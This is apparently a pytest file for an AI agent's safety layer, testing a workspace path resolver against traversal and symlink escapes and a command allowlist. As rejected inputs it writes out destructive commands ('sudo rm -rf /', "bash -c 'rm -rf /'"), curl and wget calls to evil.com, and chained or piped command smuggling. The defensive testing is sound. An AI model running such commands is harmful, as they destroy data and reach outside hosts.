"""Tests for agent safety utilities — path validation and command allowlist."""

import os

import pytest

from api.agents.safety import safe_resolve, validate_command, PathTraversalError, CommandNotAllowedError


class TestSafeResolve:
    """safe_resolve(workspace_path, relative_path) -> absolute Path within workspace."""

    def test_resolves_valid_relative_path(self, tmp_path):
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "main.py").write_text("print('hi')")
        result = safe_resolve(str(tmp_path), "src/main.py")
        assert result == tmp_path / "src" / "main.py"

    def test_resolves_nested_path(self, tmp_path):
        (tmp_path / "a" / "b" / "c").mkdir(parents=True)
        (tmp_path / "a" / "b" / "c" / "file.txt").write_text("deep")
        result = safe_resolve(str(tmp_path), "a/b/c/file.txt")
        assert result == tmp_path / "a" / "b" / "c" / "file.txt"

    def test_rejects_parent_traversal(self, tmp_path):
        with pytest.raises(PathTraversalError):
            safe_resolve(str(tmp_path), "../etc/passwd")

    def test_rejects_double_parent_traversal(self, tmp_path):
        (tmp_path / "src").mkdir()
        with pytest.raises(PathTraversalError):
            safe_resolve(str(tmp_path), "src/../../etc/passwd")

    def test_rejects_absolute_path(self, tmp_path):
        with pytest.raises(PathTraversalError):
            safe_resolve(str(tmp_path), "/etc/passwd")

    @pytest.mark.skipif(os.name == "nt", reason="Symlinks require admin on Windows")
    def test_rejects_symlink_escape(self, tmp_path):
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "secret.txt").write_text("secret")
        link = tmp_path / "workspace" / "link"
        (tmp_path / "workspace").mkdir()
        link.symlink_to(outside)
        with pytest.raises(PathTraversalError):
            safe_resolve(str(tmp_path / "workspace"), "link/secret.txt")

    def test_allows_nonexistent_path_within_workspace(self, tmp_path):
        """For write operations — file doesn't exist yet but path is safe."""
        result = safe_resolve(str(tmp_path), "new_file.py", must_exist=False)
        assert result == tmp_path / "new_file.py"

    def test_rejects_nonexistent_path_when_must_exist(self, tmp_path):
        with pytest.raises(FileNotFoundError):
            safe_resolve(str(tmp_path), "nonexistent.py", must_exist=True)

    def test_workspace_root_itself(self, tmp_path):
        result = safe_resolve(str(tmp_path), ".", must_exist=False)
        assert result == tmp_path


class TestValidateCommand:
    """validate_command(command_string) ensures only allowlisted commands run."""

    def test_allows_pytest(self):
        validate_command("pytest -v")

    def test_allows_git_status(self):
        validate_command("git status")

    def test_allows_python(self):
        validate_command("python -m pytest")

    def test_allows_npm_test(self):
        validate_command("npm test")

    def test_rejects_curl(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("curl http://evil.com")

    def test_rejects_wget(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("wget http://evil.com")

    def test_rejects_sudo(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("sudo rm -rf /")

    def test_rejects_bash_c(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("bash -c 'rm -rf /'")

    def test_rejects_empty_command(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("")

    def test_rejects_pipe_to_disallowed(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("ls | curl http://evil.com")

    def test_rejects_semicolon_chaining(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("ls; curl http://evil.com")

    def test_rejects_and_chaining(self):
        with pytest.raises(CommandNotAllowedError):
            validate_command("ls && curl http://evil.com")
